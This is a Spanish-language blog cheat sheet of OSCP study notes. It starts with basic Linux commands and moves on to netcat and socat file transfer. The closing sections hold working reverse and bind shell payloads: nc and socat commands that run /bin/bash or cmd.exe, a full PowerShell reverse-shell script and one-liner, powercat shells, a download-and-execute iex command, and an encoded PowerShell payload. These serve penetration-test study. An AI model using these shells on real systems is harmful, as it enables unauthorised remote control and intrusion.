<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>OSCP Notes - Bast1ant1c</title>
<meta name="description" content="Cheat sheet road to OSCP">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Bast1ant1c">
<meta property="og:title" content="OSCP Notes">
<meta property="og:url" content="http://localhost:4000/geheim/">


  <meta property="og:description" content="Cheat sheet road to OSCP">



  <meta property="og:image" content="http://localhost:4000/assets/images/oscp/01-inicio.png">





  <meta property="article:published_time" content="2022-07-25T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/geheim/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Bast1ant1c",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Blog</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscar</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">OSCP Notes</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name"></h3>
    
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="OSCP Notes">
    <meta itemprop="description" content="Cheat sheet road to OSCP">
    <meta itemprop="datePublished" content="July 25, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">OSCP Notes
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-07-25T00:00:00-05:00">July 25, 2022 </time>&emsp;
          
          
        </p>
        <p align="center">
<img src="/assets/images/oscp/01-inicio.png" />
</p>

<h1 id="oscp-notes">OSCP NOTES</h1>

<p>Hola! 
Vamos a lograr la certificación OSCP con estas notas!
Espero sean de gran ayuda.
Desde 0 hasta OSCP, vamos a ponernos hack!</p>

<h2 id="carpetas-de-linux">CARPETAS DE LINUX</h2>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/bin</code>		» Programas basicos (ls, cd, cat, etc.)</li>
  <li><code class="language-plaintext highlighter-rouge">/sbin</code>		» Programas del sistema (fdisk, mkfs, sysctl, etc)</li>
  <li><code class="language-plaintext highlighter-rouge">/etc</code>		» Archivos de configuración</li>
  <li><code class="language-plaintext highlighter-rouge">/tmp</code>		» Archivos temporales (typically deleted on boot)</li>
  <li><code class="language-plaintext highlighter-rouge">/usr/bin</code>	» Aplicaciones (apt, ncat, nmap, etc.)</li>
  <li><code class="language-plaintext highlighter-rouge">/usr/share</code>	» Soporte de aplicaciones y archivos con información</li>
</ul>

<h2 id="manual-de-un-comando">MANUAL DE UN COMANDO</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man &lt;COMANDO&gt;
</code></pre></div></div>

<h2 id="listar-ficheros">LISTAR FICHEROS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Listar basico</span>
<span class="nb">ls</span>
<span class="c"># Listar detallado</span>
<span class="nb">ls</span> <span class="nt">-la</span>
</code></pre></div></div>

<h2 id="desplazamiento-entre-ficheros">DESPLAZAMIENTO ENTRE FICHEROS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ir a un fichero</span>
<span class="nb">cd</span> &lt;FICHERO&gt;
<span class="c">#Ir al fichero /home/User</span>
<span class="nb">cd</span> ~
<span class="c"># Ir al fichero /</span>
<span class="nb">cd</span> /
<span class="c"># Ir al fichero anterior</span>
<span class="nb">cd</span> -
</code></pre></div></div>

<h2 id="ubicación-actual-de-fichero">UBICACIÓN ACTUAL DE FICHERO</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">pwd</span>
</code></pre></div></div>

<h2 id="crear-ficheros">CREAR FICHEROS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Crear fichero</span>
<span class="nb">mkdir</span> &lt;FICHERO&gt;
<span class="c"># Crear ficheros padre e hijos</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> &lt;FPADRE&gt;/<span class="o">{</span>&lt;FHIJO1&gt;,&lt;FHIJO2&gt;,...,&lt;FHIJOX&gt;<span class="o">}</span>
</code></pre></div></div>

<h2 id="localizar-archivos">LOCALIZAR ARCHIVOS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Localizar fichero/archivo</span>
which &lt;FICHERO/ARVHIVO&gt;
whereis &lt;FICHERO/ARVHIVO&gt;
locate &lt;FICHERO/ARVHIVO&gt;
find / <span class="nt">-name</span> &lt;FICHERO/ARCHIVO&gt;
<span class="nb">grep</span> &lt;FICHERO/ARCHIVO&gt;
</code></pre></div></div>

<h2 id="servicios">SERVICIOS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Habilitar servicio</span>
systemctl <span class="nb">enable</span> &lt;SERVICIO&gt;
<span class="c"># Iniciar servicio</span>
systemctl start &lt;SERVICIO&gt;
<span class="c"># Reiniciar servicio</span>
systemctl restart &lt;SERVICIO&gt;
<span class="c"># Detener servicio</span>
systemctl stop &lt;SERVICIO&gt;
<span class="c"># Monitorear servicio</span>
ss <span class="nt">-antlp</span> 1 <span class="nb">grep</span> &lt;SERVICIO&gt;
<span class="c"># Listar servicios disponibles</span>
systemctl list-unit-files
</code></pre></div></div>

<h2 id="actualizaciones">ACTUALIZACIONES</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Actualizar base de datos de actualizaciones</span>
apt update
<span class="c"># Instalar actualizaciones</span>
apt upgrade
<span class="c"># Instalar un paquete especifico</span>
apt <span class="nb">install</span> &lt;PAQUETE&gt;
<span class="c"># Instalar un paquete especifico offline</span>
dpkg <span class="nt">-i</span> &lt;PAQUETE_DESCARGADO.deb&gt;
<span class="c"># Eliminar un paquete especifico</span>
apt remove <span class="nt">--purge</span> &lt;PAQUETE&gt;
</code></pre></div></div>

<h2 id="variables">VARIABLES</h2>

<ul>
  <li><code class="language-plaintext highlighter-rouge">$USER</code>			» Usuario actual</li>
  <li><code class="language-plaintext highlighter-rouge">$PATH</code>			» Rutas de ejecución de programas</li>
  <li><code class="language-plaintext highlighter-rouge">$PWD</code>			» Ruta actual</li>
  <li><code class="language-plaintext highlighter-rouge">$HOME</code>			» Directorio home del usuario actual</li>
  <li><code class="language-plaintext highlighter-rouge">export a=&lt;ALGO&gt;</code>	» Declaración de una variable</li>
  <li><code class="language-plaintext highlighter-rouge">$$</code>			» Proceso PID de la shell actual</li>
  <li><code class="language-plaintext highlighter-rouge">env</code>			» Variables de entorno actuales</li>
</ul>

<h2 id="trucos-en-bash">TRUCOS EN BASH</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Historial de comandos</span>
<span class="nb">history</span>
<span class="c"># Obtener comando número N del history</span>
<span class="o">!</span>N
<span class="c"># Obtener último comando del history</span>
<span class="o">!!</span>
<span class="c"># Obtener código de estado</span>
<span class="nv">$?</span>
<span class="c"># Obtener último argumento del comando anterior</span>
<span class="o">!</span><span class="err">$</span>
</code></pre></div></div>

<h2 id="flujo-de-programas">FLUJO DE PROGRAMAS</h2>

<ul>
  <li>(0) <code class="language-plaintext highlighter-rouge">STDIN</code>	» Entrada del programa (Input)</li>
  <li>(1) <code class="language-plaintext highlighter-rouge">STDOUT</code>	» Salida del programa (Output)</li>
  <li>(2) <code class="language-plaintext highlighter-rouge">STDERR</code>	» Errores del programa (Error)</li>
</ul>

<h2 id="redirecciones">REDIRECCIONES</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Redirección sobreescribiendo</span>
<span class="nb">echo </span>hola <span class="o">&gt;</span> hola.txt
<span class="c"># Redirección sin sobreescribir</span>
<span class="nb">echo </span>hola <span class="o">&gt;&gt;</span> hola.txt
<span class="c"># Redirección a un programa</span>
hola.txt <span class="o">&gt;</span> <span class="nb">wc</span> <span class="nt">-l</span>
</code></pre></div></div>

<h2 id="piping">PIPING</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Output (STDOUT) de COMANDO1 es la entrada (STDIN) de COMANDO2</span>
&lt;COMANDO1&gt; | &lt;COMANDO2&gt;
</code></pre></div></div>

<h2 id="manipulación-de-strings">MANIPULACIÓN DE STRINGS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># SED: Modificación de palabras en string (ejemplo)</span>
<span class="nb">echo</span> <span class="s2">"I need to try hard"</span> | <span class="nb">sed</span> <span class="s1">'s/hard/harder/'</span>
I need to try harder
<span class="c"># CUT: Obtener información especifica de un string (ejemplo)</span>
<span class="nb">echo</span> <span class="s2">"I hack binaries,web apps,mobile apps, and just about anything else"</span> | <span class="nb">cut</span> <span class="nt">-f</span> 2 <span class="nt">-d</span> <span class="s2">","</span>
web apps
<span class="c"># AWK: Obtener argumentos especificos de un string (ejemplo)</span>
<span class="nb">echo</span> <span class="s2">"hello::there::friend"</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"::"</span> <span class="s1">'{print $1, $3}'</span>
hello friend
<span class="c"># SORT: Organiza y elimina duplicados del string</span>
<span class="nb">sort</span> <span class="nt">-u</span> &lt;ARCHIVO&gt;
<span class="c"># HEAD: Mostrar primeras lineas de un archivo</span>
<span class="nb">head</span> &lt;ARCHIVO&gt;
<span class="c"># TAIL: Mostrar últimas lineas de un archivo</span>
<span class="nb">tail</span> &lt;ARCHIVO&gt;
</code></pre></div></div>

<h2 id="comparar-archivos">COMPARAR ARCHIVOS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># COMM: Muestra la comparación completa</span>
<span class="nb">comm</span> &lt;ARCHIVO1&gt; &lt;ARCHIVO2&gt;
<span class="c"># COMM: Muestra las lineas en común de ambos archivos</span>
<span class="nb">comm</span> <span class="nt">-12</span> &lt;ARCHIVO1&gt; &lt;ARCHIVO2&gt;
<span class="c"># DIFF: Muestra la comparación completa</span>
diff <span class="nt">-c</span> &lt;ARCHIVO1&gt; &lt;ARCHIVO2&gt;
<span class="c"># DIFF: Muestra las lineas en común de ambos archivos (+ agrega | - elimina)</span>
diff <span class="nt">-u</span> &lt;ARCHIVO1&gt; &lt;ARCHIVO2&gt;
</code></pre></div></div>

<h2 id="procesos">PROCESOS</h2>

<ul>
  <li><code class="language-plaintext highlighter-rouge">&amp;</code>			» Proceso en segundo plano (background)</li>
  <li><code class="language-plaintext highlighter-rouge">bg</code>		» Proceso en segundo plano (background)</li>
  <li><code class="language-plaintext highlighter-rouge">jobs</code>		» Lista procesos en segundo plano (background)</li>
  <li><code class="language-plaintext highlighter-rouge">fg</code>		» Proceso en primer plano (foreground)</li>
  <li><code class="language-plaintext highlighter-rouge">fg %1</code>		» Proceso 1 enviado a primer plano (foreground)</li>
  <li><code class="language-plaintext highlighter-rouge">%N</code>		» Proceso N</li>
  <li><code class="language-plaintext highlighter-rouge">%+</code>		» Proceso actual</li>
  <li><code class="language-plaintext highlighter-rouge">%%</code>		» Proceso actual</li>
  <li><code class="language-plaintext highlighter-rouge">%-</code>		» Proceso anterior</li>
  <li><code class="language-plaintext highlighter-rouge">ps -ef</code> 	» Listado de procesos actuales</li>
  <li><code class="language-plaintext highlighter-rouge">kill &lt;PID&gt;</code>	» Eliminar proceso</li>
</ul>

<h2 id="monitoreo-de-comandos">MONITOREO DE COMANDOS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Monitorear cada 5 segundos el comando &lt;COMANDO&gt;</span>
watch <span class="nt">-n</span> 5 &lt;COMANDO&gt;
</code></pre></div></div>

<h2 id="descarga-de-archivos">DESCARGA DE ARCHIVOS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># WGET</span>
wget &lt;URL&gt;
<span class="c"># CURL</span>
curl &lt;URL&gt;
<span class="c"># AXEL</span>
axel <span class="nt">-a</span> <span class="nt">-n</span> 20 &lt;URL&gt;
</code></pre></div></div>

<h2 id="personalizar-bash-history">PERSONALIZAR BASH HISTORY</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Fichero para generar persistencia en la personalización de la shell</span>
nano ~/.bashrc
<span class="c"># Ignorar comandos duplicados en el history</span>
<span class="nb">export </span><span class="nv">HISTCONTROL</span><span class="o">=</span>ignoredups
<span class="c"># Ignorar comandos especificos</span>
<span class="nb">export </span><span class="nv">HISTIGNORE</span><span class="o">=</span><span class="s2">"&amp;:&lt;COMANDO&gt;:[bf]g:exit:history"</span>
<span class="c"># Muestra fecha y hora de ejecución de comandos</span>
<span class="nb">export </span><span class="nv">HISTTIMEFORMAT</span><span class="o">=</span><span class="s1">'%F %T '</span>
<span class="c"># Asignar alias (sobrenombre) de un comando</span>
<span class="nb">alias</span> &lt;COMANDO&gt;
<span class="c"># Eliminar alias (sobrenombre) de un comando</span>
<span class="nb">unalias</span> &lt;COMANDO&gt;
</code></pre></div></div>

<h2 id="netcat">NETCAT</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Detección del estado de un puerto</span>
nc <span class="nt">-nv</span> &lt;IP&gt; &lt;PUERTO&gt;
<span class="c"># Listener</span>
nc <span class="nt">-lnvp</span> &lt;PUERTO&gt;
<span class="c"># Envio de archivos</span>
nc <span class="nt">-nv</span> &lt;IP&gt; &lt;PUERTO&gt; &lt; &lt;ARCHIVO&gt;
<span class="c"># Recepción de archivos</span>
nc <span class="nt">-nlvp</span> &lt;PUERTO&gt; <span class="o">&gt;</span> &lt;ARCHIVO&gt;
</code></pre></div></div>

<h2 id="socat">SOCAT</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Detección del estado de un puerto</span>
socat - TCP4:&lt;IP&gt;:&lt;PUERTO&gt;
<span class="c"># Listener</span>
socat TCP4-LISTEN:&lt;PUERTO&gt; STDOUT
<span class="c"># Envio de archivos</span>
socat TCP4-LISTEN:&lt;PUERTO&gt;,fork file:&lt;ARCHIVO&gt;
<span class="c"># Recepción de archivos</span>
socat TCP4:&lt;IP&gt;:&lt;PUERTO&gt; file:&lt;ARCHIVO&gt;,create
</code></pre></div></div>

<h2 id="shells">SHELLS</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Bind shell windows</span>
nc <span class="nt">-lvnp</span> &lt;PUERTO&gt; <span class="nt">-e</span> cmd.exe
<span class="c"># Reverse shell linux</span>
nc <span class="nt">-nv</span> &lt;IP&gt; &lt;PUERTO&gt; <span class="nt">-e</span> /bin/bash
<span class="c"># Reverse shell windows</span>
C:<span class="se">\U</span>sers<span class="se">\o</span>ffsec&gt; socat <span class="nt">-d</span> <span class="nt">-d</span> TCP4-LISTEN:&lt;PUERTO&gt; STDOUTT
kali@kali:~<span class="nv">$ </span>socat TCP4:&lt;IP&gt;:&lt;PUERTO&gt; EXEC:/bin/bash
<span class="c"># Encriptar bind shell socat</span>
openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-keyout</span> bind_shell.key <span class="nt">-x509</span> <span class="nt">-days</span> 36 2 <span class="nt">-out</span> bind_shell.crt
<span class="nb">cat </span>bind_shell.key bind_shell.crt <span class="o">&gt;</span> bind_shell.pem
kali@kali:~<span class="nv">$ </span>socat OPENSSL-LISTEN:&lt;PUERTO&gt;,cert<span class="o">=</span>bind_shell.pem,verify<span class="o">=</span>0,fork EXEC:/bin/bash
C:<span class="se">\U</span>sers<span class="se">\o</span>ffsec&gt; socat - OPENSSL:&lt;IP&gt;:&lt;PUERTO&gt;,verify<span class="o">=</span>0
</code></pre></div></div>

<h2 id="powershell">POWERSHELL</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Uso de powershell sin restricción</span>
Set-ExecutionPolicy Unrestricted
<span class="c"># Sabes el estado de la política de ejecución</span>
Get-ExecutionPolicy
<span class="c"># Descarga de archivos</span>
powershell <span class="nt">-c</span> <span class="s2">"(new-object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/wget.exe','C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\o</span><span class="s2">ffsec</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\w</span><span class="s2">get.exe')"</span>
</code></pre></div></div>

<h2 id="powershell-reverse-shell-code">POWERSHELL REVERSE SHELL CODE</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'&lt;IP&gt;'</span>,&lt;PUERTO&gt;<span class="o">)</span><span class="p">;</span>
<span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span>
<span class="o">[</span>byte[]]<span class="nv">$bytes</span> <span class="o">=</span> 0..65535|%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span>
<span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> <span class="nt">-ne</span> 0<span class="o">)</span>
<span class="o">{</span>
<span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object <span class="nt">-TypeName</span> System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span>
<span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span>
<span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span>
<span class="nv">$stream</span>.Flush<span class="o">()</span><span class="p">;</span>
<span class="o">}</span>
<span class="nv">$client</span>.Close<span class="o">()</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="powershell-reverse-shell-oneliner">POWERSHELL REVERSE SHELL (ONELINER)</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('&lt;IP&gt;',&lt;PUERTO&gt;);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out String ); </span><span class="nv">$sendback2</span><span class="s2"> =</span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span>
</code></pre></div></div>

<h2 id="powershell-bind-shell-oneliner">POWERSHELL BIND SHELL (ONELINER)</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$listener</span><span class="s2"> = New-Object System.Net.Sockets.TcpListener('&lt;IP&gt;',&lt;PUERTO&gt;);</span><span class="nv">$listener</span><span class="s2">.start();</span><span class="nv">$client</span><span class="s2"> = </span><span class="nv">$listener</span><span class="s2">.AcceptTcpClient();</span><span class="nv">$stream</span><span class="s2"> =  </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> =([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close();</span><span class="nv">$listener</span><span class="s2">.Stop()"</span>
</code></pre></div></div>

<h2 id="powercat">POWERCAT</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Instalar powercat en linux</span>
apt <span class="nb">install </span>powercat
<span class="c"># Cargar un script local en powershell</span>
..<span class="se">\p</span>owercat.ps1
iex <span class="o">(</span>New-Object System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="o">)</span>
<span class="c"># Transferir archivos</span>
kali@kali:~<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> &lt;PUERTO&gt; <span class="o">&gt;</span> receiving_powercat.ps1
PS C:<span class="se">\U</span>sers<span class="se">\O</span>ffsec&gt; powercat <span class="nt">-c</span> &lt;IP&gt; <span class="nt">-p</span> &lt;PUERTO&gt; <span class="nt">-i</span> C:<span class="se">\U</span>sers<span class="se">\O</span>ffsec<span class="se">\p</span>owercat.ps1
</code></pre></div></div>

<h2 id="powercat-reverse-shell">POWERCAT REVERSE SHELL</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvp</span> &lt;PUERTO&gt;
PS C:<span class="se">\U</span>sers<span class="se">\o</span>ffsec&gt; powercat <span class="nt">-c</span> &lt;IP&gt; <span class="nt">-p</span> &lt;PUERTO&gt; <span class="nt">-e</span> cmd.exe
</code></pre></div></div>

<h2 id="powercat-bind-shell">POWERCAT BIND SHELL</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\o</span>ffsec&gt; powercat <span class="nt">-l</span> <span class="nt">-p</span> &lt;PEURTO&gt; <span class="nt">-e</span> cmd.exe
kali@kali:~<span class="nv">$ </span>nc &lt;IP&gt; &lt;PUERTO&gt;
</code></pre></div></div>

<h2 id="powercat-codificar-una-reverse-shell">POWERCAT CODIFICAR UNA REVERSE SHELL</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\o</span>ffsec&gt; powercat <span class="nt">-c</span> &lt;IP&gt; <span class="nt">-p</span> &lt;PUERTO&gt; <span class="nt">-e</span> cmd.exe <span class="nt">-ge</span> <span class="o">&gt;</span> encodedreverseshell.ps1
PS C:<span class="se">\U</span>sers<span class="se">\o</span>ffsec&gt; powershell.exe <span class="nt">-E</span> ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
kali@kali:~<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> &lt;PUERTO&gt;
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#notas" class="page__taxonomy-item" rel="tag">Notas</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#oscp" class="page__taxonomy-item" rel="tag">OSCP</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#certificaci%C3%B3n" class="page__taxonomy-item" rel="tag">Certificación</a>
    
    </span>
  </p>


        
